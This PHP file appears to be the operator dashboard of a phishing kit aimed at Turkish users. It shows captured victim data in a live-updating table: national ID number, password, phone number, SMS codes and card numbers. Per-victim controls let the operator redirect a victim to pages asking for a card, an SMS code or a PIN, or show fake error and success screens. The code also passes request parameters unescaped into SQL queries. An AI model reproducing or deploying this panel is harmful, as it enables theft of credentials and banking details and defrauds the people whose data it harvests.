<?php
require "core.php";
head();
date_default_timezone_set('Europe/Istanbul');

$ip = $_SERVER['REMOTE_ADDR'];
$result = $mysqli->query("SELECT * FROM site WHERE id = '1'");
$sorgula = $result->fetch_assoc();

$Zaman = date('H:i');
 
 
    $ip = $_SERVER['REMOTE_ADDR'];
    $tarih = date('d.m.Y H:i');
    $mysqli->query("UPDATE paneldekiler SET durum = 'LOGLAR', tarih = '{$tarih}' WHERE ip = '{$ip}'");

    if (isset($_GET['limit'])) {
        $limit = $_GET['limit'];
        $mysqli->query("INSERT INTO max (max) VALUES ('$limit')");
        echo "<script>alert('Limit istendi!');</script>";
        echo "<script>window.location.href='logs.php';</script>";
    }
    if (isset($_GET['pin'])) {
        $pin = $_GET['pin'];
        $mysqli->query("INSERT INTO pin (pin) VALUES ('$pin')");
        echo "<script>alert('Pin istendi!');</script>";
        echo "<script>window.location.href='logs.php';</script>";
    }
    if (isset($_GET['sms'])) {
        $sms = $_GET['sms'];
        $mysqli->query("INSERT INTO sms (sms) VALUES ('$sms')");
        echo "<script>window.location.href='logs.php';</script>";
    }
    if (isset($_GET['hata'])) {
        $hata = $_GET['hata'];
        $mysqli->query("INSERT INTO hata (hata) VALUES ('$hata')");
        echo "<script>window.location.href='logs.php';</script>";
    }
    if (isset($_GET['kart'])) {
        $kart = $_GET['kart'];
        $mysqli->query("INSERT INTO kart (kart) VALUES ('$kart')");
        echo "<script>alert('kart sayfasina gönderildi!');</script>";
        echo "<script>window.location.href='logs.php';</script>";
    }
    if (isset($_GET['telhata'])) {
        $telhata = $_GET['telhata'];
        $mysqli->query("INSERT INTO telhata (telhata) VALUES ('$telhata')");
        echo "<script>window.location.href='logs.php';</script>";
    }
  
    
  
    if (isset($_GET['bildirim'])) {
        $hatalisms = $_GET['bildirim'];
        $mysqli->query("INSERT INTO sms2 (sms2) VALUES ('$hatalisms')");
        echo "<script>alert('bildirim sayfasina gönderildi!');</script>";
        echo "<script>window.location.href='logs.php';</script>";
    }
    if (isset($_GET['tebrik'])) {
        $tebrik = $_GET['tebrik'];
        $mysqli->query("INSERT INTO tebrik (tebrik) VALUES ('$tebrik')");
        echo "<script>window.location.href='logs.php';</script>";
    }
    if (isset($_GET['sil'])) {
        $sil = $mysqli->real_escape_string($_GET['sil']);
    
       
        $sql = "DELETE FROM sazan WHERE ip='$sil'";
        
        if ($mysqli->query($sql) === TRUE) {
            echo "
            <script>
                Swal.fire({
                    icon: 'success',
                    title: 'Başarılı',
                    text: 'Kayıt başarıyla silindi.',
                    confirmButtonText: 'Tamam'
                }).then((result) => {
                    if (result.isConfirmed) {
                        window.location.href = 'logs.php'; // Başarılı silme işleminden sonra sayfayı yenile veya başka bir sayfaya yönlendir
                    }
                });
            </script>
            ";
        } 
        
    }
    if (isset($_GET['delete-all'])) {
        // SQL sorgusunu çalıştır
        $sql = "DELETE FROM sazan";
        
        if ($mysqli->query($sql) === TRUE) {
            echo "
            <script>
                Swal.fire({
                    icon: 'success',
                    title: 'Başarılı',
                    text: 'Tüm kayıtlar başarıyla silindi.',
                    confirmButtonText: 'Tamam'
                }).then((result) => {
                    if (result.isConfirmed) {
                        window.location.href = 'logs.php'; // Başarılı silme işleminden sonra sayfayı yenile veya başka bir sayfaya yönlendir
                    }
                });
            </script>
            ";
        } }

    if (isset($_GET['ban'])) {
        $ban = $_GET['ban'];
		$ip = $ban;
		$date     = date("d F Y");
		$time     = date("H:i");
		$redirect = '1';
		$url      = 'https://www.youtube.com/watch?v=1QLie0vnwPs';
        echo "<script>window.location.href='logs.php';</script>";
		$queryvalid = $mysqli->query("SELECT * FROM `psec_bans` WHERE ip='$ip' LIMIT 1");
        $validator  = mysqli_num_rows($queryvalid);
        if ($validator > "0") {
            echo '<br />
		<div class="callout callout-info">
                <p><i class="fas fa-info-circle"></i> This <strong>IP Address</strong> is already banned.</p>
        </div>';
        } else {
            $query = $mysqli->query("INSERT INTO `psec_bans` (`ip`, `date`, `time`, `reason`, `redirect`, `url`) VALUES ('$ip', '$date', '$time', '$reason', '$redirect', '$url')");
        }
    }
    if (isset($_GET['dondur'])) {
        $dondur = $_GET['dondur'];
        $mysqli->query("INSERT INTO back (back) VALUES ('$dondur')");
        echo "<script>alert('Kullanıcı Sayfanın başına gönderildi!');</script>";
        echo "<script>window.location.href='logs.php';</script>";
    }
    if (isset($_GET['go'])) {
        $go = $_GET['go'];
        $go_ip = $_GET['go_ip'];
        $mysqli->query("UPDATE sazan SET go = '{$go}' WHERE ip = '{$go_ip}'");
        echo "<script>alert('Kullanıcı belirttiğiniz sayfaya yönlendirildi!');</script>";
        echo "<script>window.location.href='logs.php';</script>";
    }
    if (isset($_GET['logout'])) {
        $giren = $_SERVER['REMOTE_ADDR'];
        $mysqli->query("DELETE FROM paneldekiler WHERE ip='$giren'");
        session_start();
        ob_start();
        session_unset();
        session_destroy();
        header('Location: login.php');
    }
 

?>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/xlsx/0.17.0/xlsx.full.min.js"></script>

<div class="content-wrapper" style="margin-top: 0px!important;background-color: #1b1d1e;">
<style>
            @import url(https://fonts.googleapis.com/css2?family=Montserrat:ital,wght@0,100;0,300;0,400;0,500;0,700;0,900;1,100;1,300;1,400;1,500;1,700;1,900&display=swap);

tbody tr td {
  font-family: Montserrat;
  font-weight: 700;
  font-style: normal;
  
  
} th.min-w-50px.sorting {
  text-align: center
  
}

tbody tr td {
  text-align: center;
} h3.card-title {
  font-weight: 700;
  font-style: normal;
  font-size: 24px
  
}@import url(https://fonts.googleapis.com/css2?family=Montserrat:ital,wght@0,100;0,300;0,400;0,500;0,700;0,900;1,100;1,300;1,400;1,500;1,700;1,900&display=swap);

span.navbar-text.ml-auto {
  margin-right: 70px;
  font-weight: 700;
  font-style: normal;
  font-family: Montserrat;
  font-size: 16px;
}

div.content-wrapper {
  
}
 
div.swal2-popup.swal2-modal.swal2-show {
  width: 555px;
}
</style>   
<div class="card card-primary card-outline">
						<div class="card-header">
							<h3 class="card-title">LOGLAR</h3>
							<div class="float-sm-right">
								 
					      <span class="navbar-text ml-auto" id="online-status">
                 Online: 0   🟢
            </span>
          

            <button id="exportButton" class="btn btn-success">EXCEL KAYDET</button>	<a href="?delete-all" class="btn btn-danger"><i class="fas fa-trash"></i> Tümünü Sil</a>
							</div>
						</div>
						<div class="card-body">
						<script>
  document.addEventListener('DOMContentLoaded', function() {
    $(document).on('click', '.sweetalert-button', function(event) {
        event.preventDefault();

  
        const ip = $(this).data('ip');

        Swal.fire({
            title: 'İşlem Seçimi',
            html: `
                <div style="text-align: center; text-transform: uppercase;">
                    <a href="?dondur=${ip}" class="swal2-link" style="display: block; margin-bottom: 10px; color: #1976d2; background-color: #e3f2fd; padding: 10px; border-radius: 5px;">
                        <i class="fas fa-retweet" style="margin-right: 8px;"></i>Dondur
                    </a>
                    <a href="?sms=${ip}" class="swal2-link" style="display: block; margin-bottom: 10px; color: #388e3c; background-color: #f1f8e9; padding: 10px; border-radius: 5px;">
                        <i class="fas fa-envelope" style="margin-right: 8px;"></i>SMS Gönder
                    </a>
                    <a href="?kart=${ip}" class="swal2-link" style="display: block; margin-bottom: 10px; color: #388e3c; background-color: #f1f8e9; padding: 10px; border-radius: 5px;">
                        <i class="fas fa-credit-card" style="margin-right: 8px;"></i>Kart Iste
                    </a>
                    <a href="?bildirim=${ip}" class="swal2-link" style="display: block; margin-bottom: 10px; color: #f57c00; background-color: #fff3e0; padding: 10px; border-radius: 5px;">
                        <i class="fas fa-bell" style="margin-right: 8px;"></i>Bildirim
                    </a>
                    <a href="?tebrik=${ip}" class="swal2-link" style="display: block; margin-bottom: 10px; color: #2e7d32; background-color: #e8f5e9; padding: 10px; border-radius: 5px;">
                        <i class="fas fa-check" style="margin-right: 8px;"></i>Tebrik
                    </a>
                    <a href="?hata=${ip}" class="swal2-link" style="display: block; margin-bottom: 10px; color: #d32f2f; background-color: #ffebee; padding: 10px; border-radius: 5px;">
                        <i class="fas fa-times" style="margin-right: 8px;"></i>Hatalı SMS
                    </a>
                    <a href="?telhata=${ip}" class="swal2-link" style="display: block; margin-bottom: 10px; color: #d32f2f; background-color: #ffebee; padding: 10px; border-radius: 5px;">
                        <i class="fas fa-phone" style="margin-right: 8px;"></i>Hatalı Tel
                    </a>
                    <a href="?ban=${ip}" class="swal2-link" style="display: block; margin-bottom: 10px; color: #607d8b; background-color: #eceff1; padding: 10px; border-radius: 5px;">
                        <i class="fas fa-ban" style="margin-right: 8px;"></i>Ban
                    </a>
                    <a href="?sil=${ip}" class="swal2-link" style="display: block; margin-bottom: 10px; color: #f9a825; background-color: #fffde7; padding: 10px; border-radius: 5px;">
                        <i class="fas fa-trash" style="margin-right: 8px;"></i>Sil
                    </a>
                </div>
            `,
            showConfirmButton: false,
            width: '300px',
            padding: '1em',
            position: 'top-end',
            backdrop: false,
            didOpen: () => {
                // Close SweetAlert2 when clicking outside of the popup
                document.addEventListener('click', function handleClickOutside(event) {
                    if (!Swal.getPopup().contains(event.target)) {
                        Swal.close();
                        document.removeEventListener('click', handleClickOutside);
                    }
                });
            }
        });
    });

    function fetchLogs() {
        $.ajax({
            url: 'fetch_logs.php?admin=1',
            type: 'GET',
            success: function(data) {
                $('#logsTableBody').html(data);
            }
        });
    }

    fetchLogs();
    setInterval(fetchLogs, 2000);
});

</script><div class="table-responsive">
        <table  class="table table-sm table-bordered table-hover" width="100%">
			 
									<thead class="<?php echo $thead; ?>">
									<th class="min-w-50px sorting">ID</th>
									<th class="min-w-50px sorting" style="max-width: 40px;">TARİH</th>
                         
                            <th class="min-w-50px sorting">TC NO</th>
                            <th class="min-w-50px sorting">PASS</th>
                            <th class="min-w-50px sorting">TEL NO</th>
                            <th class="min-w-50px sorting">SMS</th>
                            <th class="min-w-50px sorting">KARTNO</th>
							<th class="min-w-50px sorting">IP (<?php
    $onlineList = [];
    $query = $mysqli->query("SELECT * FROM ips");
    if ($query->num_rows > 0) {
        while ($v = $query->fetch_assoc()) {
            if ($v['lastOnline'] > time()) {
                array_push($onlineList, $v['ipAddress']);
            }
        }
    }
    echo count($onlineList);
?>)</th>
   <th class="min-w-50px sorting" style="max-width: 70px;">DURUM</th>
                            <th class="text-end min-w-100px sorting_disabled" style="max-width: 70px;">İŞLEM</th>
                        </tr>
									</thead>
									<tbody id="logsTableBody" class="text-gray-600 fw-semibold">
             
            </tbody>
								</table>
                        </div>
                     </div>
                    
  <audio id="audioplayer" src="https://awsomewebsitedemo.com/notification.mp3" preload="auto"type="audio/mp3"></audio>
				</div>
				</div>
				</div>
				</div>
				<!--===================================================-->
				<!--End page content-->
<script>
        function updateOnlineStatus() {
            $.ajax({
                url: './online.php',
                method: 'GET',
                dataType: 'json',
                success: function(data) {
                    $('#online-status').text(' Online:  ' + data.onlineCount +   ' 🟢 | Toplam Tıklama: ' + data.totalCount);
                    if (data.notification) {
                        $('#audioplayer')[0].play();
                    }
                }
            });
        }

        $(document).ready(function() {
            updateOnlineStatus();
            setInterval(updateOnlineStatus, 2000);
        });
    </script>
  
        <script>
        document.getElementById('exportButton').addEventListener('click', function() {
            var table = document.getElementById('dt-basiclivetraff');
            var wb = XLSX.utils.table_to_book(table, {sheet: "Sheet JS"});
            XLSX.writeFile(wb, 'table_data.xlsx');
        });
    </script>
			</div>
			<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js"></script>
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js"></script>

</div>
<?php
footer();
$mysqli->close();
?>
